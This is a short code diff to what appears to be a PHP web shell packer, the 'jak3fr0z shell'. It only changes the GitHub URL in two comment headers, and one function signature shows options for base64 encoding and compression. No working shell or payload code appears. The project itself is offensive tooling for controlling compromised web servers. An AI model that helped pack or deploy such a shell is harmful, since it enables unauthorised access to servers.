@@ -3,7 +3,7 @@
 	jak3fr0z shell
 	Jake Tancinco
 	(c)2016
-	https://github.com/jak3fr0z/jak3fr0z
+	https://github.com/PhilCodeEx/jak3fr0z
 
 */
 $GLOBALS['packer']['title'] = "jak3fr0z shell packer";
@@ -519,7 +519,7 @@ function packer_jak3fr0z($output, $phpcode, $htmlcode, $strip, $base64, $compres
 	jak3fr0z shell ".$version."
 	Jake Tancinco
 	(c)".@date("Y",time())."
-	https://github.com/jak3fr0z/jak3fr0z
+	https://github.com/PhilCodeEx/jak3fr0z
 
 */\n";
 
